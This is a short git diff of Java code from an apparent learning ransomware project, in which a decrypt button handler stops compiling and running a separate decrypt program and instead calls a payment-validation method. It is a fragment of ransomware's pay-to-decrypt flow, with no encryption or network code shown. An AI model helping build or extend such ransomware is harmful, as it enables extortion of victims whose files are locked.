@@ -114,8 +114,8 @@ class DecryptListener implements ActionListener{
     @Override
     public void actionPerformed(ActionEvent e){
         try{
-            Runtime.getRuntime().exec("javac /root/Learning/Ransomware/src/decrypt.java");
-            Runtime.getRuntime().exec("java /root/Learning/Ransomware/src/decrypt");
+            decrypt dec = new decrypt();
+            dec.validatePayment();
         }
         catch (IOException err){
             err.printStackTrace();
